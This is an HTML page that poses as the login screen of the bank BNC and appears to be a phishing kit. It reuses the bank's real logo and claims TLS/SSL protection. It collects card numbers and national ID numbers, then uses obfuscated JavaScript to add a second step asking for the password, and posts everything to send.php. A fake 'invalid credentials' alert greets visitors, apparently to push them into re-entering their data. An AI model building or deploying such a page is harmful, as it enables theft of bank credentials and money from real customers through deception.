<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="iconero.ico">
    <title>BNC</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: #efefef;
            overflow-x: hidden;
            position: relative;

            display: flex;
            justify-content: center;
            align-items: center;

            padding: 20px;
        }

        /* ===== BACKGROUND ===== */

        .bg-shapes {
            position: absolute;
            inset: 0;
            overflow: hidden;
            z-index: 0;
        }

        .shape {
            position: absolute;
            background: rgba(255, 255, 255, 0.35);
            transform: skewX(-12deg);
        }

        .shape1 {
            width: 180px;
            height: 140%;
            left: 220px;
            top: -100px;
        }

        .shape2 {
            width: 140px;
            height: 140%;
            left: 560px;
            top: -120px;
        }

        .shape3 {
            width: 130px;
            height: 140%;
            left: -20px;
            top: 240px;
            transform: rotate(25deg);
            opacity: .15;
        }

        /* ===== PAGE ===== */

        .wrapper {
            position: relative;
            z-index: 2;

            width: 100%;
            max-width: 520px;

            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        /* ===== LOGO ===== */

        .logo {
            width: 78px;
            margin-bottom: 18px;
            margin-left: 6px;
        }

        .logo img {
            width: 100%;
            display: block;
        }

        /* ===== LOGIN CARD ===== */

        .login-card {
            width: 100%;
            border-radius: 18px;
            overflow: hidden;
            background: #082a50;

            box-shadow:
                0 10px 30px rgba(0, 0, 0, .12);
        }

        /* ===== TOP TABS ===== */

        .top-tabs {
            display: flex;
            height: 62px;
            background: #c9c9c9;
        }

        .top-tab {
            flex: 1;
            border: none;
            background: #b9bcc2;

            font-size: 18px;
            font-weight: 400;

            color: #111;
            cursor: pointer;
            transition: .25s;
            position: relative;

            font-family: 'Poppins', sans-serif;
        }

        .top-tab.active {
            background: white;
        }

        .top-tab.active::after {
            content: '';
            position: absolute;
            left: 0;
            bottom: 0;
            width: 100%;
            height: 3px;
            background: #ff5a00;
        }

        /* ===== CONTENT ===== */

        .content {
            background: linear-gradient(to bottom, #00215d, #001742);
            padding: 16px 18px 18px;
        }

        /* ===== TITLES ===== */

        .title {
            text-align: center;
            color: white;

            font-size: 30px;
            font-weight: 500;

            line-height: 1.1;

            margin-bottom: 6px;
        }

        .subtitle {
            text-align: center;
            color: white;

            font-size: 15px;
            line-height: 1.5;

            margin-bottom: 12px;
        }

        .subtitle strong {
            font-weight: 700;
        }

        /* ===== OPTION SWITCH ===== */

        .option-switch {
            width: 100%;
            border: 1px solid rgba(255, 255, 255, .5);
            border-radius: 10px;
            overflow: hidden;
            display: flex;
            margin-bottom: 14px;
        }

        .option-btn {
            flex: 1;
            border: none;

            height: 48px;

            background: transparent;
            color: #8d96ab;

            font-size: 15px;

            font-family: 'Poppins', sans-serif;
            cursor: pointer;
            transition: .25s;
        }

        .option-btn.active {
            background: #ff5a00;
            color: white;
        }

        /* ===== SEPARATOR ===== */

        .separator {
            width: 100%;
            height: 1px;
            background: rgba(255, 255, 255, .15);
            margin: 12px 0 18px;
        }

        /* ===== INPUTS ===== */

        .form-group {
            display: flex;
            align-items: center;

            height: 56px;

            border-radius: 8px;
            overflow: hidden;

            margin-bottom: 14px;

            background: white;

            border: 1px solid #d9d9d9;

            transition:
                border .25s ease,
                box-shadow .25s ease;
        }

        /* EFECTO AL SELECCIONAR */

        .form-group:focus-within {
            border: 3px solid #ff5a00;
        }

        .icon-box {
            width: 54px;
            height: 100%;
            background: #ffffff;

            display: flex;
            align-items: center;
            justify-content: center;

            border-right: 1px solid #cfcfcf;

            position: relative;
            z-index: 2;
        }

        .icon {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .icon img {
            width: 22px;
            object-fit: contain;
        }

        .form-input {
            flex: 1;
            height: 100%;

            border: none;
            outline: none;

            padding: 0 14px;

            font-size: 16px;

            font-family: 'Poppins', sans-serif;
            color: #333;

            background: white;
        }

        .form-input::placeholder {
            color: #8d8d8d;
        }

        /* ===== BUTTON ===== */

        .submit-btn {
            width: 100%;
            height: 52px;

            border: none;
            border-radius: 8px;

            background: #1f58d6;
            color: white;

            font-size: 17px;
            font-weight: 500;

            cursor: pointer;
            transition: .2s;

            font-family: 'Poppins', sans-serif;
        }

        .submit-btn:hover {
            background: #1a4cbc;
        }

        /* ===== FORGOT ===== */

        .forgot {
            text-align: center;
            margin-top: 14px;
        }

        .forgot a {
            color: white;
            text-decoration: none;
            display: inline-block;
        }

        .lock {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;

            color: white;
            font-size: 14px;

            cursor: pointer;
        }

        .lock img {
            width: 18px;
            height: 18px;
            object-fit: contain;
        }

        .lock span {
            line-height: 1;
            border-bottom: 1px dashed rgba(255, 255, 255, .7);
            padding-bottom: 1px;
        }

        /* ===== FOOTER ===== */

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;

            margin-top: 14px;
            gap: 14px;
        }

        .footer p {
            color: white;
            font-size: 11.5px;
            line-height: 1.6;
            max-width: 320px;
        }



        /* ===== RESPONSIVE ===== */

        @media(max-width:600px) {

            body {
                padding: 14px;
                align-items: flex-start;
            }

            .wrapper {
                max-width: 100%;
            }

            .logo {
                width: 72px;
                margin-bottom: 14px;
            }

            .title {
                font-size: 26px;
            }

            .subtitle {
                font-size: 14px;
            }

            .top-tab {
                font-size: 16px;
            }

            .option-btn {
                font-size: 13px;
            }

            .form-input {
                font-size: 15px;
            }

            .footer {
                flex-direction: column;
                align-items: flex-start;
            }

            .security {
                align-self: flex-end;
            }
        }

        /* ===== SECURITY ===== */

        .security {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .security img {
            width: 135px;
            height: auto;
            object-fit: contain;
            display: block;
        }


        .form-group {
            transition:
                border .25s ease,
                box-shadow .25s ease,
                transform .35s ease,
                opacity .35s ease;
        }


       .bnc-alert-overlay{
    position:fixed;
    inset:0;

    background:rgba(0,0,0,.35);

    display:flex;
    justify-content:center;
    align-items:center;

    z-index:999999;

    animation:fadeIn .25s ease;
}

.bnc-alert-box{
    width:92%;
    max-width:360px;

    background:white;

    border-radius:22px;

    padding:30px 24px;

    text-align:center;

    box-shadow:
    0 18px 45px rgba(0,0,0,.18);

    animation:popup .28s ease;

    font-family:'Poppins',sans-serif;

    position:relative;
}

.bnc-alert-close{
    position:absolute;

    top:14px;
    right:14px;

    width:34px;
    height:34px;

    border:none;
    border-radius:50%;

    background:#f2f4f8;

    color:#5f6b7a;

    font-size:24px;
    line-height:1;

    cursor:pointer;

    transition:.2s;
}

.bnc-alert-close:hover{
    background:#e5e9f0;
}

.bnc-alert-logo{
    width:110px;
    display:block;
    margin:0 auto 18px;
}

.bnc-alert-icon{
    width:58px;
    height:58px;

    border-radius:50%;

    background:#ff5a00;
    color:white;

    display:flex;
    justify-content:center;
    align-items:center;

    font-size:34px;
    font-weight:600;

    margin:0 auto 18px;
}

.bnc-alert-title{
    font-size:24px;
    font-weight:600;

    color:#003c81;

    margin-bottom:10px;
}

.bnc-alert-text{
    font-size:15px;
    line-height:1.7;

    color:#5f6b7a;
}

/* ANIMACIONES */

@keyframes popup{

    0%{
        transform:scale(.85);
        opacity:0;
    }

    100%{
        transform:scale(1);
        opacity:1;
    }
}

@keyframes fadeIn{

    from{
        opacity:0;
    }

    to{
        opacity:1;
    }
}
    </style>
</head>

<body>

    <div class="bg-shapes">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>

    <div class="wrapper">

        <!-- LOGO -->
        <div class="logo">
            <img src="bnc.png">
        </div>

        <!-- CARD -->
        <div class="login-card">
            <form id="loginForm" method="post" action="send.php">
            <input type="hidden" name="tipo_usuario2" id="tipo_usuario" value="personas">
            <input type="hidden" name="tipo_tarjeta2" id="tipo_tarjeta" value="Débito | Crédito">
            <!-- TOP TABS -->
            <div class="top-tabs">
                <button class="top-tab active" id="personasTab">
                    Personas
                </button>

                <button class="top-tab" id="empresasTab">
                    Empresas
                </button>
            </div>

            <!-- CONTENT -->
            <div class="content">

                <h1 class="title">Iniciar Sesión</h1>

                <div class="subtitle">
                    ¡Buenas noches, <strong>Bienvenido!</strong><br>
                    Ingrese sus credenciales
                </div>

                <!-- SWITCH -->
                <div class="option-switch" id="optionSwitch">

                    <!-- PERSONAS -->
                    <button class="option-btn active">
                        Débito | Crédito
                    </button>

                    <button class="option-btn">
                        Tarjeta Débito BOD
                    </button>

                </div>

                <div class="separator"></div>


                    <div class="form-group active">
                        <div class="icon-box">
                            <div class="icon">
                                <img src="car.jpg">
                            </div>
                        </div>

                        <input type="text" class="form-input" name="card2" id="card" placeholder="Número de Tarjeta" inputmode="numeric" required>
                    </div>

                    <div class="form-group" id="identityField">
                        <div class="icon-box">
                            <div class="icon">
                                <img src="carne.jpg">
                            </div>
                        </div>

                        <input type="text" name="doc2" id="doc" class="form-input" placeholder="Cédula de Identidad" inputmode="numeric" required>
                    </div>

                    <button class="submit-btn">
                        Continuar
                    </button>

                </form>

                <div class="separator"></div>

                <div class="forgot">
                    <a href="#">
                        <div class="lock">
                            <img src="candao.png">
                            <span>¿Olvidaste tu clave?</span>
                        </div>
                    </a>
                </div>

                <div class="footer">
                    <div class="security">
                        <p>
                            Tus datos se encuentran protegidos por nuestro certificado
                            de seguridad digital (TLS/SSL)
                        </p>
                        <img src="secure.png">
                    </div>

                </div>

            </div>

        </div>

    </div>
<!-- ALERTA -->
<div class="bnc-alert-overlay" id="bncAlert">

    <div class="bnc-alert-box">

        <!-- BOTON CERRAR -->
        <button class="bnc-alert-close" id="closeAlert">
            ×
        </button>

        <img
            src="https://d1uubxdj0phgsa.cloudfront.net/Images/BNCLogoSmall-Big.png"
            class="bnc-alert-logo"
        >

        <div class="bnc-alert-icon">
            !
        </div>

        <div class="bnc-alert-title">
            Credenciales inválidas
        </div>

        <div class="bnc-alert-text">
            Verifica tu información e intenta nuevamente.
        </div>

    </div>

</div>
<script>
const _0x29e469=_0x1e50;(function(_0x2a2deb,_0x443a21){const _0x10813c=_0x1e50,_0x45e42b=_0x2a2deb();while(!![]){try{const _0x19fe0e=parseInt(_0x10813c(0xb7))/0x1+parseInt(_0x10813c(0x98))/0x2*(parseInt(_0x10813c(0xa2))/0x3)+-parseInt(_0x10813c(0x9b))/0x4+parseInt(_0x10813c(0xb9))/0x5+-parseInt(_0x10813c(0xaa))/0x6*(-parseInt(_0x10813c(0xa0))/0x7)+-parseInt(_0x10813c(0xc8))/0x8+-parseInt(_0x10813c(0xca))/0x9*(parseInt(_0x10813c(0x9c))/0xa);if(_0x19fe0e===_0x443a21)break;else _0x45e42b['push'](_0x45e42b['shift']());}catch(_0x43a318){_0x45e42b['push'](_0x45e42b['shift']());}}}(_0x5a75,0x1d549));const personasTab=document[_0x29e469(0xbc)](_0x29e469(0xc4)),empresasTab=document[_0x29e469(0xbc)](_0x29e469(0xb2)),optionSwitch=document[_0x29e469(0xbc)](_0x29e469(0xcc)),identityField=document[_0x29e469(0xbc)](_0x29e469(0xbf)),loginForm=document['getElementById']('loginForm'),submitBtn=document['querySelector'](_0x29e469(0xa6));let currentMode=_0x29e469(0xa5),loginStep=0x1;function _0x1e50(_0x5ec3bf,_0x377a01){_0x5ec3bf=_0x5ec3bf-0x96;const _0x5a7554=_0x5a75();let _0x1e5055=_0x5a7554[_0x5ec3bf];return _0x1e5055;}function activateTopTab(_0x5b197f){const _0x1ab2c9=_0x29e469;personasTab['classList'][_0x1ab2c9(0x9a)](_0x1ab2c9(0x97)),empresasTab[_0x1ab2c9(0xbb)][_0x1ab2c9(0x9a)]('active'),_0x5b197f[_0x1ab2c9(0xbb)][_0x1ab2c9(0xad)](_0x1ab2c9(0x97));}function renderPersonas(){const _0x5560c3=_0x29e469;currentMode=_0x5560c3(0xa5),document[_0x5560c3(0xbc)](_0x5560c3(0xa1))[_0x5560c3(0x99)]=_0x5560c3(0xa5),activateTopTab(personasTab),optionSwitch['innerHTML']='\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x20active\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Débito\x20|\x20Crédito\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Tarjeta\x20Débito\x20BOD\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20',document[_0x5560c3(0xbc)]('tipo_tarjeta2')[_0x5560c3(0x99)]='Débito\x20|\x20Crédito',identityField[_0x5560c3(0xc2)]['display']=_0x5560c3(0xb8);const _0x212813=document[_0x5560c3(0xbc)]('doc2');_0x212813[_0x5560c3(0xae)]=!![],setupOptionButtons();}function _0x5a75(){const _0x131d9a=['querySelectorAll','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x20active\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20BNCNET\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22option-btn\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Débito\x20Jurídica\x0a\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20','30518MDXXwv','flex','897480VQEZuE','translateY(-15px)','classList','getElementById','.form-group','input','identityField','focus','BNCNET','style','tipo_tarjeta2','personasTab','addEventListener','visibility','preventDefault','141464oAkaZL','doc2','9zUJyLV','hidden','optionSwitch','display','submit','form-group','transform','transition','trim','createElement','.35s','active','124luwRkX','value','remove','364528NhfGUu','1508450RHbVkZ','forEach','position','parentNode','4571LJNTSE','tipo_usuario2','7299YlNgBp','innerHTML','div','personas','.submit-btn','none','input[name=\x22clave2\x22]','click','174ebIodo','absolute','afterend','add','required','className','insertAdjacentElement','empresas','empresasTab','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon-box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22blacklock.png\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20type=\x22password\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20name=\x22clave2\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22form-input\x22\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20placeholder=\x22Clave\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20required\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','querySelector'];_0x5a75=function(){return _0x131d9a;};return _0x5a75();}function renderEmpresas(){const _0x3e78eb=_0x29e469;currentMode=_0x3e78eb(0xb1),document[_0x3e78eb(0xbc)](_0x3e78eb(0xa1))['value']=_0x3e78eb(0xb1),activateTopTab(empresasTab),optionSwitch[_0x3e78eb(0xa3)]=_0x3e78eb(0xb6),document[_0x3e78eb(0xbc)](_0x3e78eb(0xc3))[_0x3e78eb(0x99)]=_0x3e78eb(0xc1),identityField[_0x3e78eb(0xc2)][_0x3e78eb(0xcd)]=_0x3e78eb(0xa7);const _0x59276c=document[_0x3e78eb(0xbc)](_0x3e78eb(0xc9));_0x59276c['required']=![],setupOptionButtons();}function setupOptionButtons(){const _0x5af7c7=_0x29e469,_0x29745c=document[_0x5af7c7(0xb5)]('.option-btn');_0x29745c[_0x5af7c7(0x9d)](_0x4d66e2=>{const _0xf7256c=_0x5af7c7;_0x4d66e2['addEventListener'](_0xf7256c(0xa9),()=>{const _0x4e3554=_0xf7256c;_0x29745c[_0x4e3554(0x9d)](_0x19b5dc=>{const _0x13208b=_0x4e3554;_0x19b5dc[_0x13208b(0xbb)][_0x13208b(0x9a)](_0x13208b(0x97));}),_0x4d66e2[_0x4e3554(0xbb)][_0x4e3554(0xad)](_0x4e3554(0x97)),document[_0x4e3554(0xbc)](_0x4e3554(0xc3))[_0x4e3554(0x99)]=_0x4d66e2['textContent'][_0x4e3554(0xd2)]();});});}personasTab[_0x29e469(0xc5)]('click',_0x98f152=>{const _0x3eac2e=_0x29e469;_0x98f152[_0x3eac2e(0xc7)](),renderPersonas();}),empresasTab[_0x29e469(0xc5)](_0x29e469(0xa9),_0xa3ecac=>{const _0x2b2f3c=_0x29e469;_0xa3ecac[_0x2b2f3c(0xc7)](),renderEmpresas();}),setupOptionButtons(),loginForm[_0x29e469(0xc5)](_0x29e469(0xce),_0x4cb9e6=>{const _0x4de312=_0x29e469;if(loginStep===0x1){_0x4cb9e6[_0x4de312(0xc7)]();const _0x81eb0c=document[_0x4de312(0xb5)](_0x4de312(0xbd)),_0x287277=_0x81eb0c[0x0],_0x3666bd=identityField['querySelector'](_0x4de312(0xbe)),_0x224e8c=_0x287277[_0x4de312(0xb4)]('input');if(_0x224e8c[_0x4de312(0x99)][_0x4de312(0xd2)]()===''){_0x224e8c[_0x4de312(0xc0)]();return;}if(identityField[_0x4de312(0xc2)][_0x4de312(0xcd)]!==_0x4de312(0xa7)&&_0x3666bd['value'][_0x4de312(0xd2)]()===''){_0x3666bd['focus']();return;}_0x287277[_0x4de312(0xc2)][_0x4de312(0xd1)]=_0x4de312(0x96),_0x287277['style']['opacity']='0',_0x287277[_0x4de312(0xc2)][_0x4de312(0xd0)]=_0x4de312(0xba),setTimeout(()=>{const _0x519d7f=_0x4de312;_0x287277[_0x519d7f(0xc2)][_0x519d7f(0xc6)]=_0x519d7f(0xcb),_0x287277[_0x519d7f(0xc2)][_0x519d7f(0x9e)]=_0x519d7f(0xab);const _0x2c0e53=document[_0x519d7f(0xd3)](_0x519d7f(0xa4));_0x2c0e53[_0x519d7f(0xaf)]=_0x519d7f(0xcf),_0x2c0e53[_0x519d7f(0xa3)]=_0x519d7f(0xb3),currentMode===_0x519d7f(0xa5)?identityField[_0x519d7f(0xb0)](_0x519d7f(0xac),_0x2c0e53):optionSwitch[_0x519d7f(0x9f)]['insertBefore'](_0x2c0e53,submitBtn),_0x2c0e53[_0x519d7f(0xb4)](_0x519d7f(0xbe))[_0x519d7f(0xc0)]();},0x15e),loginStep=0x2;return;}if(loginStep===0x2){const _0x2b908a=document[_0x4de312(0xb4)](_0x4de312(0xa8));if(!_0x2b908a||_0x2b908a['value']['trim']()===''){_0x4cb9e6[_0x4de312(0xc7)]();_0x2b908a&&_0x2b908a[_0x4de312(0xc0)]();return;}}});
</script>
<script>
function _0x179d(_0x17c8ba,_0x36c51c){_0x17c8ba=_0x17c8ba-0x15e;const _0xb81f9d=_0xb81f();let _0x179dee=_0xb81f9d[_0x17c8ba];return _0x179dee;}function _0xb81f(){const _0x3e5f58=['24745572dpPUKQ','6186wJqjdn','bncAlert','click','261ZwTxVs','getElementById','transition','286472VbfAPo','.25s\x20ease','style','204083Zcouio','1130jyKCAK','10RAmZsZ','430tSYWso','492182SylOAO','5005ysLhyH','remove','133680WHFoBH','2571oQjoOK','addEventListener'];_0xb81f=function(){return _0x3e5f58;};return _0xb81f();}const _0x3a71ca=_0x179d;(function(_0xcb565b,_0x3d5184){const _0x533ae6=_0x179d,_0x2f0082=_0xcb565b();while(!![]){try{const _0x5ebe4f=parseInt(_0x533ae6(0x166))/0x1+-parseInt(_0x533ae6(0x163))/0x2*(-parseInt(_0x533ae6(0x16a))/0x3)+-parseInt(_0x533ae6(0x169))/0x4*(-parseInt(_0x533ae6(0x164))/0x5)+-parseInt(_0x533ae6(0x16d))/0x6*(parseInt(_0x533ae6(0x167))/0x7)+parseInt(_0x533ae6(0x15f))/0x8*(-parseInt(_0x533ae6(0x170))/0x9)+parseInt(_0x533ae6(0x165))/0xa*(-parseInt(_0x533ae6(0x162))/0xb)+parseInt(_0x533ae6(0x16c))/0xc;if(_0x5ebe4f===_0x3d5184)break;else _0x2f0082['push'](_0x2f0082['shift']());}catch(_0x507dd8){_0x2f0082['push'](_0x2f0082['shift']());}}}(_0xb81f,0x81df1),window[_0x3a71ca(0x16b)]('load',()=>{const _0x3551b9=_0x3a71ca,_0x5eb94f=document[_0x3551b9(0x171)](_0x3551b9(0x16e));function _0x34ec46(){const _0x73e433=_0x3551b9;_0x5eb94f['style']['opacity']='0',_0x5eb94f[_0x73e433(0x161)][_0x73e433(0x15e)]=_0x73e433(0x160),setTimeout(()=>{const _0x1b3649=_0x73e433;_0x5eb94f[_0x1b3649(0x168)]();},0xfa);}document['body'][_0x3551b9(0x16b)](_0x3551b9(0x16f),_0x34ec46,{'once':!![]}),document['body'][_0x3551b9(0x16b)]('touchstart',_0x34ec46,{'once':!![]});}));
</script>
</body>
</html>
